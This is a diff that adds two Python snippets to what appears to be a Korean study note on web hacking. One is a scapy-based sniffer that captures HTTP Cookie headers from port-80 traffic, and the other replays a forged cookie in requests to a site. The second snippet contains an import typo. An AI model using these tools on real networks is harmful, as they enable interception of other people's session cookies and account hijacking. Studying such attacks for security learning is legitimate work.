@@ -166,9 +166,44 @@ Connection:
 #### 쿠키 스니퍼
 ---
 
+```python
+from scapy.all import *
+import re
+def cookieSniffer(packet):
+    tcp = packet.getlayer('TCP')
+    cookie = re.search(r'Cookie: (.+)\\r\\n', str(tcp.payload))
+    if cookie:
+        print(cookie.group())
+def main():
+    print('+++START SNIFFING COOKIE')
+    sniff(filter='tcp port 80', store=0, prn=cookieSniffer)
+if __name__ == '__main__':
+    main()
+```
+
 ---
 #### 쿠키 스푸핑
 ---
+
+```
+from urllib.reqeust import urlopen, Request
+user_agent = 'Mozilla/5.0 ~~~ '
+cookie = '~~~~~'  #조작하려는 쿠키 문자열
+
+def cookieSpoof(url):
+	req = Request(url)
+	req.add_header('User-Agent', user_agent)
+	req.add_header('Cookie', cookie)
+	with urlopen(req) as h:
+		print(h.read())
+		
+def main():
+	url = 'http://www.google.com'
+	cookieSpoof(url)
+
+if __name__=='__main__':
+	main()
+```
 
 ---
 ### 웹 링크 크롤러 
